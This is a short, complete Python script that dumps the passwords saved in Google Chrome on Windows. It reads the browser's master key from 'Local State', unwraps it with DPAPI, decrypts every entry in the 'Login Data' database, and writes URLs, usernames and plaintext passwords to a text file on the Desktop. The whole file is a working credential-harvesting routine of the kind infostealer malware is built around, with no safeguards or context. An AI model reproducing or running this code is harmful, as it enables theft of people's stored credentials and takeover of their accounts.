import os
import sqlite3
import win32crypt
import shutil
from Cryptodome.Cipher import AES
import base64
import json
import pathlib
import sys

def get_encryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    
    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        return f"Error decrypting password: {e}"

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    filename = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'Chrome_Passwords.txt')

    if not os.path.exists(db_path):
        print(f"Chrome database not found at {db_path}. Exiting.")
        sys.exit(0)

    # Make a temporary copy of the database file
    shutil.copy2(db_path, "Login Data.db")
    
    conn = sqlite3.connect("Login Data.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        with open(filename, 'w') as f:
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                password = decrypt_password(encrypted_password, key)
                if username or password:
                    f.write(f"Origin URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
            print(f"Passwords saved to {filename}")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        cursor.close()
        conn.close()
        os.remove("Login Data.db")

if __name__ == "__main__":
    main()
